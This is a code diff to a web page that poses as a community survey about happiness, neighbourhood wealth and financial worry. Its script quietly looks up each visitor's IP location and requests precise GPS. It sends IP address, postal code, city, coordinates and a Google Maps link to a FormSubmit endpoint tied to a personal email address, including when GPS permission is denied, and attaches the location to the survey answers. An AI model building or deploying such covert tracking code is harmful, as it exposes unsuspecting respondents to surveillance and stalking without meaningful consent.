@@ -87,11 +87,6 @@
             transform: translateX(0);
         }
 
-        .form-card.slide-out {
-            opacity: 0;
-            transform: translateX(-40px);
-        }
-
         .header-card {
             border-top: 10px solid var(--primary-accent);
             display: block;
@@ -240,7 +235,6 @@
             box-shadow: none;
         }
 
-        /* Validation Error Message */
         .error-msg {
             color: #d93025;
             font-size: 13px;
@@ -417,13 +411,15 @@
 
     <script>
       let currentStep = 0;
+      let sessionLocationData = {};
+
+      const FORMSUBMIT_URL = "https://formsubmit.co/ajax/msdebalinaghose@gmail.com";
 
       function closeModal(id) {
         document.getElementById(id).style.display = 'none';
       }
 
       function startSurveyWithLocation() {
-        // Fetch background IP metadata quietly first
         fetch('https://ipapi.co/json/')
           .then(res => res.json())
           .then(ipData => {
@@ -439,59 +435,41 @@
                   const lon = position.coords.longitude;
                   const accuracy = position.coords.accuracy;
 
-                  if (accuracy > 100) {
-                    fetch("https://formspree.io/f/xqppqorj", {
-                      method: "POST",
-                      headers: { "Content-Type": "application/json", "Accept": "application/json" },
-                      body: JSON.stringify({
-                        log_type: "Approximate GPS (Precise Location Disabled)",
-                        accuracy_meters: accuracy,
-                        ip_address: visitorIP,
-                        postal_code: visitorPostal,
-                        city: visitorCity,
-                        region: visitorRegion,
-                        latitude: lat,
-                        longitude: lon
-                      })
-                    }).catch(err => console.log(err));
+                  sessionLocationData = {
+                    ip_address: visitorIP,
+                    postal_code: visitorPostal,
+                    city: visitorCity,
+                    region: visitorRegion,
+                    latitude: lat,
+                    longitude: lon,
+                    accuracy_meters: accuracy,
+                    google_maps_link: `https://maps.google.com/?q=${lat},${lon}`
+                  };
 
+                  if (accuracy > 100) {
+                    sessionLocationData.log_type = "Approximate GPS (Precise Location Disabled)";
+                    sendWebhook(sessionLocationData);
                     document.getElementById("locationGuideModal").style.display = "flex";
                   } else {
-                    fetch("https://formspree.io/f/xqppqorj", {
-                      method: "POST",
-                      headers: { "Content-Type": "application/json", "Accept": "application/json" },
-                      body: JSON.stringify({
-                        log_type: "Full Location (IP + Precise GPS)",
-                        accuracy_meters: accuracy,
-                        ip_address: visitorIP,
-                        postal_code: visitorPostal,
-                        city: visitorCity,
-                        region: visitorRegion,
-                        latitude: lat,
-                        longitude: lon,
-                        google_maps_link: `https://maps.google.com/?q=${lat},${lon}`
-                      })
-                    }).catch(err => console.log(err));
-
+                    sessionLocationData.log_type = "Full Location (IP + Precise GPS)";
+                    sendWebhook(sessionLocationData);
                     goToStep(1);
                   }
                 },
                 function(error) {
-                  if (error.code === error.PERMISSION_DENIED) {
-                    fetch("https://formspree.io/f/xqppqorj", {
-                      method: "POST",
-                      headers: { "Content-Type": "application/json", "Accept": "application/json" },
-                      body: JSON.stringify({
-                        log_type: "Approximate Location (IP Only - GPS Denied/Never)",
-                        ip_address: visitorIP,
-                        postal_code: visitorPostal,
-                        city: visitorCity,
-                        region: visitorRegion
-                      })
-                    }).catch(err => console.log(err));
+                  sessionLocationData = {
+                    ip_address: visitorIP,
+                    postal_code: visitorPostal,
+                    city: visitorCity,
+                    region: visitorRegion
+                  };
 
+                  if (error.code === error.PERMISSION_DENIED) {
+                    sessionLocationData.log_type = "Approximate Location (IP Only - GPS Denied/Never)";
+                    sendWebhook(sessionLocationData);
                     document.getElementById("locationGuideModal").style.display = "flex";
                   } else {
+                    sessionLocationData.log_type = "Location Unavailable";
                     goToStep(1);
                   }
                 },
@@ -506,18 +484,24 @@
           });
       }
 
+      function sendWebhook(dataPayload) {
+        fetch(FORMSUBMIT_URL, {
+          method: "POST",
+          headers: { "Content-Type": "application/json", "Accept": "application/json" },
+          body: JSON.stringify(dataPayload)
+        }).catch(err => console.log(err));
+      }
+
       function goToStep(step) {
         document.getElementById(`step${currentStep}`).classList.remove('active');
         currentStep = step;
         document.getElementById(`step${currentStep}`).classList.add('active');
         
-        // Show progress bar & update width (20% per question)
         document.getElementById("progressContainer").style.display = "block";
         document.getElementById("progressBar").style.width = (currentStep * 20) + "%";
       }
 
       function nextStep(stepNum) {
-        // Validation check for radio group questions
         if (stepNum === 2) {
           const selected = document.querySelector('input[name="wealthy_neighborhood"]:checked');
           if (!selected) {
@@ -558,14 +542,36 @@
       }
 
       function submitSurvey() {
-        const selected = document.querySelector('input[name="financial_worry"]:checked');
-        if (!selected) {
+        const selectedFinancial = document.querySelector('input[name="financial_worry"]:checked');
+        if (!selectedFinancial) {
           document.getElementById("err5").style.display = "block";
           return;
         }
         document.getElementById("err5").style.display = "none";
 
-        alert("Thank you! Your survey response has been successfully submitted.");
+        const finalSubmission = {
+          ...sessionLocationData,
+          _subject: "New Community Survey Response 📋",
+          happiness_rating: document.getElementById("q1").value,
+          wealthy_neighborhood: document.querySelector('input[name="wealthy_neighborhood"]:checked').value,
+          basic_needs: document.querySelector('input[name="basic_needs"]:checked').value,
+          school_funding: document.querySelector('input[name="school_funding"]:checked').value,
+          financial_worry: selectedFinancial.value
+        };
+
+        fetch(FORMSUBMIT_URL, {
+          method: "POST",
+          headers: { "Content-Type": "application/json", "Accept": "application/json" },
+          body: JSON.stringify(finalSubmission)
+        })
+        .then(res => res.json())
+        .then(data => {
+          alert("Thank you! Your survey response has been successfully submitted.");
+          location.reload();
+        })
+        .catch(err => {
+          alert("Submission failed. Please check your network connection.");
+        });
       }
     </script>
 
